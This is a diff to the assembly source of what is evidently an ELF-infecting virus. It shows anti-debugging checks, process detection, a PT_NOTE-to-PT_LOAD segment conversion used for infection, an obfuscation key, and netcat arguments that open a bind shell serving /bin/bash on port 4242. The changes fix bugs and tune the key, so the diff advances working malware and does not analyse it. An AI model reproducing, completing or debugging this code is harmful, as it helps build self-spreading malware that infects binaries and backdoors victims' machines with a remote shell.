@@ -105,7 +105,7 @@ can_run_infection:
 	jl .debugged					; 	goto .debugged;
 
 	call check_process				; _ret = check_process();
-	cmp rax, 1					; if (_ret == !)
+	cmp rax, 1					; if (_ret == 1)
 	je .process					; 	goto .process;
 .end_anti_debugging:
 
@@ -297,7 +297,8 @@ check_process:
 	syscall						; );
 
 .end:
-	mov rax, [result]				; return result;
+	xor rax, rax
+	mov al, [result]				; return result;
 	add rsp, %$localsize
 	pop rbp
 	%pop
@@ -485,8 +486,8 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-magic_key: db 0xf0, 0xe8, 0x3d, 0x58, 0x04, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0xd4, 0x32, 0xf6, 0x48, 0x79, 0x5f
-db 0x1a, 0x98, 0x4b, 0x83, 0xf8, 0xb9, 0x75, 0x67, 0xe8, 0x82, 0xe8, 0x48, 0x02, 0x48, 0x83, 0x13
+magic_key: db 0xf0, 0xe8, 0x3d, 0x5a, 0x04, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0xd6, 0x32, 0xf6, 0x48, 0x79, 0x5f
+db 0x1a, 0x9a, 0x4b, 0x83, 0xf8, 0xb9, 0x75, 0x67, 0xe8, 0x82, 0xe8, 0x4a, 0x02, 0x48, 0x83, 0x13
 db 0x2f, 0xe4, 0xfc
 magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
@@ -1247,8 +1248,6 @@ convert_pt_note_to_load:
 
 _end:
 
-; TODO Create label "outside children/infected" or something like that
-
 ; void compression(long *compressed_data_size_ptr, uint8_t *compressed_data_ptr);
 ; void compression(rdi compressed_data_size_ptr, rsi compressed_data_ptr);
 compression:
@@ -1349,7 +1348,6 @@ compression:
 	jmp .write_byte				; ...
 
 .write_token:					; {
-	; TODO Fix size of variables, play with byte/qword, it is ugly
 	mov rax, [dest_end_ptr]			; 	_cur_dest_ptr = dest_end_ptr;
 	sub rax, [i_dest]			; 	_cur_dest_ptr -= i_dest;
 	mov byte [rax], COMPRESSION_TOKEN	; 	*_cur_dest_ptr = COMPRESSION_TOKEN;
